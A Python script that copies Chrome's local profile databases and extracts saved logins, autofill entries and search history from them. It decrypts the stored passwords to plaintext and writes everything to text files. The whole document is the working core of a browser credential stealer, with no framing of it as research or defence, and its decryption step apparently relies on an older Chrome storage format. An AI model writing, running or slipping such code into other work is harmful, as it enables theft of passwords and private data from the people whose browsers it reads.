import sqlite3
import os
from shutil import copyfile
from win32crypt import CryptUnprotectData
from datetime import datetime


db_dir = os.getenv('LOCALAPPDATA') + r'\Google\Chrome\User Data\Default'


copyfile(db_dir + '\Login Data', 'Login Data')
conn = sqlite3.connect('Login Data')
c = conn.cursor()
c.execute('SELECT origin_url, username_value, password_value FROM logins')
data = c.fetchall()
conn.close()
os.remove('Login Data')
if len(data) > 0:
    with open('chrome_login_data.txt', 'wt') as f:
        for origin_url, username_value, password_value in data:
            f.write('URL: %s\n' % origin_url)
            f.write('    User: %s\n' % username_value)
            f.write('    Password: %s\n\n' % CryptUnprotectData(password_value, None, None, None, 0)[1].decode())
    print('Login data successfully written to chrome_login_data.txt')
else:
    print('No login data found.')


copyfile(db_dir + '\Web Data', 'Web Data')
conn = sqlite3.connect('Web Data')
c = conn.cursor()
c.execute('SELECT name, value, date_created, date_last_used, count FROM autofill')
data = c.fetchall()
conn.close()
os.remove('Web Data')
if len(data) > 0:
    with open('chrome_autofill_data.txt', 'wt') as f:
        for name, value, date_created, date_last_used, count in data:
            f.write('Name: %s\n' % name)
            f.write('    Value: %s\n' % value)
            f.write('    Date created: %s\n' % datetime.utcfromtimestamp(date_created).strftime('%Y-%m-%d %H:%M:%S'))
            f.write('    Date last used: %s\n' % datetime.utcfromtimestamp(date_last_used).strftime('%Y-%m-%d %H:%M:%S'))
            f.write('    Count: %d\n\n' % count)
    print('Autofill data successfully written to chrome_autofill_data.txt')
else:
    print('No autofill data found.')


copyfile(db_dir + '\History', 'History')
conn = sqlite3.connect('History')
c = conn.cursor()
c.execute('SELECT urls.url, keyword_search_terms.term FROM keyword_search_terms INNER JOIN urls ON urls.id=keyword_search_terms.url_id')
data = c.fetchall()
conn.close()
os.remove('History')
if len(data) > 0:
    with open('chrome_search_data.txt', 'wt') as f:
        for url, term in data:
            f.write('URL: %s\n' % url)
            f.write('Term: %s\n\n\n' % term)
    print('Search history successfully written to chrome_search_data.txt')
else:
    print('No search history found.')
